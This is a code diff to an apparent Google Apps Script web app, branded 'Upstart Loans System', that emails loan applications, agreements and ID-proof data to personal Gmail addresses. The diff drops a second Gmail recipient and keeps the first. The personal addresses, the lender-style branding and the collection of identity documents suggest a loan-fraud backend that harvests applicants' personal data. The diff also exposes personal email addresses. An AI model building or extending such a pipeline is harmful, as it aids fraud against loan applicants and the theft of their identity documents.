@@ -5,7 +5,6 @@
 
 // Configuration
 const PRIMARY_EMAIL = "finnfoxpersonalloan@gmail.com";
-const SECONDARY_EMAIL = "tyronlincolnn@gmail.com";
 
 function doGet(e) {
   return HtmlService.createHtmlOutput(`
@@ -14,7 +13,6 @@ function doGet(e) {
     <p><strong>Current emails:</strong></p>
     <ul>
       <li>Primary: ${PRIMARY_EMAIL}</li>
-      <li>Secondary: ${SECONDARY_EMAIL}</li>
     </ul>
   `);
 }
@@ -113,11 +111,6 @@ function sendApplicationEmail(data) {
     htmlBody: htmlBody,
     name: 'Upstart Loans System'
   });
-  
-  GmailApp.sendEmail(SECONDARY_EMAIL, subject, '', {
-    htmlBody: htmlBody,
-    name: 'Upstart Loans System'
-  });
 }
 
 function sendAgreementEmail(data) {
@@ -162,11 +155,6 @@ function sendAgreementEmail(data) {
     htmlBody: htmlBody,
     name: 'Upstart Loans System'
   });
-  
-  GmailApp.sendEmail(SECONDARY_EMAIL, subject, '', {
-    htmlBody: htmlBody,
-    name: 'Upstart Loans System'
-  });
 }
 
 function sendErrorEmail(error, data) {
@@ -180,7 +168,6 @@ function sendErrorEmail(error, data) {
   `;
   
   GmailApp.sendEmail(PRIMARY_EMAIL, subject, body);
-  GmailApp.sendEmail(SECONDARY_EMAIL, subject, body);
 }
 
 function saveIdProofToCustomerDashboard(data) {
